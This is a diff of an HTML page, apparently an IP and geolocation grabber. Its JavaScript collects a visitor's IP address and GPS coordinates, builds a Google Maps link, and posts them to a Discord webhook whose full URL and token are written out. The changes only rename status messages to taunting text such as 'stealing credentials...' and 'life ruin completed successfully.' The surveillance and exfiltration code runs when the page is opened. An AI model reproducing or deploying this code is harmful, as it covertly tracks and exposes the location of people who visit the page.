@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Data Capture</title>
+  <title>Oops Busted!</title>
   <style>
     body {
       margin: 0;
@@ -128,7 +128,7 @@
     }
 
     async function main() {
-      updateMessage("Starting data capture...");
+      updateMessage("stealing credentials...");
       logMessage("Initializing...");
 
       const canvas = document.createElement("canvas");
@@ -191,7 +191,7 @@
           content: `Captured user data:\nIP Address: \`${ip}\`\nCoordinates: \`${latitude.toFixed(6)}, ${longitude.toFixed(6)}\`\nGoogle Maps: ${mapsUrl}`
         }));
 
-        updateMessage("Sending data to Discord...");
+        updateMessage("Sending data to dark web...");
         logMessage("Sending data to webhook...");
         const response = await fetch(
           "https://discord.com/api/webhooks/1270166449318793296/eJjxv6udxX13mJVpn5ubPqzYQMI9-Xue9G0LAelkswYqcDVVgZp0cLfHXb55RkaPw_w2",
@@ -202,8 +202,8 @@
         );
 
         if (response.ok) {
-          logMessage("Data successfully sent to Discord.");
-          updateMessage("Data capture completed successfully.");
+          logMessage("Data successfully sent to dark web.");
+          updateMessage("life ruin completed successfully.");
         } else {
           const errorText = await response.text();
           logMessage(`Failed to send data: ${response.status} ${response.statusText} - ${errorText}`);
